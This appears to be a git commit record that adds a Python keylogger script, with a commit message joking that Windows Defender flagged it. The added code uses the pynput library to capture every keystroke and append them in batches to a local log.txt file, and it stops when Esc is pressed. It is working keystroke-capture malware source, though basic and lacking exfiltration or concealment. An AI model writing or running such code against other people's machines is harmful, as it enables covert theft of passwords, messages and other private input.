5803c4cd9c91943fed0aed0694c1390344cbe439
Justin Abell <justinabell@hotmail.com>
2022-08-17 11:12:29 -0700

    Fix
    Windows defender freaked out when it found my keylogger file (lol)

---
+++ keylogger/keylogger.py
@@ -0,0 +1,30 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    #print("(0) pressed".format{key})
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            f.write(str(key))
+
+def on_release(key):
+    if key == key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
